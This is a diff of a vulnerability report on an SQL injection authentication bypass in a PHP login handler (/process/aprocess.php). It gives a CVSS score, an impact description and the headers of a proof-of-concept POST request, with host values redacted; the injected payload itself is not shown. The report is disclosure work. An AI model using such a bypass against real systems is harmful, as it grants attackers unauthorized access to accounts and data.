@@ -1,9 +1,9 @@
 # SQL Injection Authentication Bypass Report
 
-## Title: SQL Injection Authentication Bypass
-## Affected Component: /process/aprocess.php
-## CWE-287: Improper Authentication
-## CVSS Base Score: 7.5
+### Title: SQL Injection Authentication Bypass
+### Affected Component: /process/aprocess.php
+### CWE-287: Improper Authentication
+### CVSS Base Score: 7.5
 
 ### Impact:
 SQL injection authentication bypass poses a significant threat by enabling unauthorized access to the system, allowing attackers to exploit vulnerabilities in authentication mechanisms. This can lead to severe consequences including unauthorized entry into sensitive areas, exposure of confidential data, manipulation of system integrity, reputational damage, and potential regulatory compliance violations. The exploit's ability to circumvent authentication safeguards undermines the confidentiality, integrity, and availability of the system, emphasizing the critical need for robust security measures and prompt mitigation of SQL injection vulnerabilities to safeguard against these multifaceted risks.
@@ -14,11 +14,11 @@ To demonstrate the SQL injection authentication bypass vulnerability, begin by a
 #### HTTP Request:
 ```http
 POST /process/aprocess.php HTTP/1.1
-Host: localhost:8080
+Host: [REDACTED]
 Content-Length: 48
 Cache-Control: max-age=0
 sec-ch-ua: "Chromium";v="121", "Not A(Brand";v="99"
-Origin: http://localhost:8080
+Origin: [REDACTED]
 sec-ch-ua-mobile: ?0
 Upgrade-Insecure-Requests: 1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36
@@ -28,7 +28,7 @@ sec-ch-ua-platform: "macOS"
 Sec-Fetch-Site: same-origin
 Sec-Fetch-Mode: navigate
 Sec-Fetch-Dest: empty
-Referer: http://localhost:8080//alogin.html
+Referer: [REDACTED]
 Accept-Encoding: gzip, deflate, br
 Accept-Language: en-US,en;q=0.9
 Connection: close
